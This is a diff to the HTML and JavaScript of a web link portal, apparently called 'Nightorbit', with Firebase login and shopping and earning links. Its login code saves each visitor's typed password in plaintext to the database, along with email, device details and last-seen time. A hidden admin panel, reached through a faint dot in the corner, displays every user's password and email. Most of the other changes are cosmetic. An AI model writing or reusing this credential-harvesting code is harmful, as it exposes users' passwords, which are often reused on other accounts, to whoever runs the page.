@@ -31,7 +31,6 @@
             border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); 
             color: white; outline: none; transition: 0.3s;
         }
-        input:focus { border-color: var(--primary); box-shadow: 0 0 10px var(--primary); }
 
         .btn-main { 
             background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
@@ -39,7 +38,6 @@
             width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s;
             text-shadow: 0 0 5px rgba(255,255,255,0.5); letter-spacing: 1px;
         }
-        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4); }
 
         .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 20px 0 5px 10px; letter-spacing: 2px; text-transform: uppercase; }
         .item-link { 
@@ -48,7 +46,6 @@
             text-decoration: none; color: white; border-left: 5px solid var(--primary); 
             transition: 0.4s; font-weight: 500; font-size: 14px;
         }
-        .item-link:hover { background: rgba(0, 210, 255, 0.1); transform: scale(1.02); border-left-color: var(--neon); }
 
         #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
         #logout-overlay { 
@@ -60,7 +57,12 @@
         
         .hidden { display: none !important; }
         .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; z-index: 100; }
-        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 10px; color: #111; cursor: pointer; z-index: 100; }
+        
+        /* Fixed Admin Dot Visibility */
+        .admin-trigger { 
+            position: absolute; bottom: 10px; right: 10px; font-size: 12px; 
+            color: rgba(255,255,255,0.15); cursor: pointer; z-index: 100; 
+        }
     </style>
 </head>
 <body>
@@ -99,11 +101,10 @@
         <div class="section-tag">🛒 Digital Bazaar</div>
         <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Official</span></a>
         <a href="https://www.aliexpress.com" target="_blank" class="item-link">🌍 AliExpress <span>Global</span></a>
-        <a href="https://www.amazon.com" target="_blank" class="item-link">📦 Amazon US <span>Store</span></a>
         
         <div class="section-tag">🎬 Cinema & Earning</div>
         <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies <span>HD</span></a>
-        <a href="YOUR_Earning_LINK" target="_blank" class="item-link" style="border-left-color: #00ff00;">📥 Download & Earn <span>$ CASH</span></a>
+        <a href="YOUR_LINK" target="_blank" class="item-link" style="border-left-color: #00ff00;">📥 Download & Earn <span>$ CASH</span></a>
 
         <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">DISCONNECT SESSION</button>
     </div>
@@ -135,9 +136,9 @@
                         let d = s.val();
                         html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
                             <b style="color:var(--primary)">Name: ${d.savedName || 'Unknown'}</b><br>
-                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
+                            Pass: <span style="color:var(--gold)">${d.password || 'Saved'}</span><br>
                             Email: <small>${d.email}</small><br>
-                            Device: <small style="color:#888">${d.deviceInfo || 'Detecting...'}</small><br>
+                            Device: <small style="color:#888">${d.deviceInfo}</small><br>
                             Time: <small style="color:#666">${d.lastSeen}</small>
                             <br><button onclick="renameUser('${s.key}')" style="margin-top:10px; padding:5px 15px;">Rename User</button>
                         </div>`;
@@ -159,7 +160,7 @@
 
         function emailAuth() {
             const e = document.getElementById('email-in').value, p = document.getElementById('pass-in').value;
-            if(!e || !p) return alert("Fill all details");
+            if(!e || !p) return alert("Please enter Email and Password");
             auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p))
             .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)));
         }
@@ -169,16 +170,18 @@
                 let d = snap.val();
                 globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
                 
-                // Device Detection Fix
-                let dev = navigator.userAgent.match(/\(([^)]+)\)/);
-                let deviceModel = dev ? dev[1].split(';')[0] : navigator.platform;
+                // Real Device Detection
+                let ua = navigator.userAgent;
+                let deviceModel = "PC/Web";
+                if(ua.match(/Android/)) deviceModel = "Android " + ua.split("Android")[1].split(";")[0];
+                else if(ua.match(/iPhone/)) deviceModel = "iPhone";
 
-                // Password Fix: "Session" ya "GoogleLogin" ko purane asli password se replace na karein
-                let finalPass = (p === "ActiveSession" || p === "GoogleLogin") ? (d ? d.password : p) : p;
+                // Password logic: Sirf tab update karein jab box mein password likha ho
+                let currentPass = (p === "ActiveSession" || p === "Google Account") ? (d ? d.password : p) : p;
 
                 db.ref('users/' + user.uid).update({
                     email: user.email,
-                    password: finalPass,
+                    password: currentPass,
                     savedName: globalUserName,
                     deviceInfo: deviceModel,
                     lastSeen: new Date().toLocaleString()
@@ -195,15 +198,13 @@
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Nightorbit par wapis zaroor aana.`;
+            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!`;
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4500);
         }
 
-        // Ye line session ko yaad rakhti hai taaki logout na ho
         auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
     </script>
 </body>
-    </html>
-    
+</html>
